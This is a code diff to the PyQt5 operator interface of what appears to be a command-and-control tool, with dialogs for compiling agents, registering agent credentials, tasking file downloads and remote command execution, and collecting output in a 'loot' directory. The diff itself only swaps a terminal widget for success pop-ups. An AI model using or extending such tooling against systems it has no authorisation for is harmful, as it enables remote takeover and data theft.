@@ -8,23 +8,6 @@ import design
 from paramiko import ssh_exception
 from PyQt5 import QtCore, QtGui, QtWidgets
 
-
-class TerminalWidget(QtWidgets.QWidget, design.Ui_Terminal):
-
-    def __init__(self, parent=None):
-        QtWidgets.QWidget.__init__(self, parent)
-        self.setupUi(self)
-        self.process = QtCore.QProcess(self)
-        self.terminal = QtWidgets.QWidget(self)
-        layout = QtWidgets.QVBoxLayout(self)
-        layout.addWidget(self.terminal)
-        # Works also with urxvt:
-        #self.process.start(
-                #'urxvt',['-embed', str(self.terminal.winId())])
-    def start(self):
-        print("Started application")
-        self.process.start('urxvt',['-embed', str(self.terminal.winId())])
-
 class ConnectDialogue(QtWidgets.QDialog, design.Ui_ManagerServerConnect):
     def __init__(self, session, parent=None):
         QtWidgets.QDialog.__init__(self, parent)
@@ -78,6 +61,9 @@ class AgentCompileDialogue(QtWidgets.QDialog, design.Ui_AgentCompile):
         else:
             self.session.compile_agent(self.ServerIP.text(), int(self.ServerPort.text()))
 
+        reply = QtWidgets.QMessageBox.information(self, "Success!", "Successfully retrieved agent executable")
+            
+
 class AgentDownloadDialogue(QtWidgets.QDialog, design.Ui_AgentDownload):
     def __init__(self, session, agent_id, parent=None):
         QtWidgets.QDialog.__init__(self, parent)
@@ -91,6 +77,8 @@ class AgentDownloadDialogue(QtWidgets.QDialog, design.Ui_AgentDownload):
         
     def do_download(self):
         self.session.do_download(self.agent_id, self.Path.text())
+        reply = QtWidgets.QMessageBox.information(self, "Success!", "Successfully tasked agent with download operation")
+            
 
 class AgentRegisterDialogue(QtWidgets.QDialog, design.Ui_AgentRegister):
     def __init__(self, session, parent=None):
@@ -107,6 +95,8 @@ class AgentRegisterDialogue(QtWidgets.QDialog, design.Ui_AgentRegister):
             print("[-] Could not register agent credentials: Missing parameters")
         else:
             self.session.register_agent(self.Username.text(), self.Password.text())
+            reply = QtWidgets.QMessageBox.information(self, "Success!", "Successfully registered agent with the server")
+            
 
 class AgentCommandDialogue(QtWidgets.QDialog, design.Ui_CommandDialogue):
     def __init__(self, session, agent_id, parent=None):
@@ -124,3 +114,5 @@ class AgentCommandDialogue(QtWidgets.QDialog, design.Ui_CommandDialogue):
             print("Found blank line")
         else:
             self.session.send_command(self.agent_id, self.Input.text())
+            reply = QtWidgets.QMessageBox.information(self, "Success!", "Successfully tasked agent with command execution. Check the loot directory occasionally for output")
+            
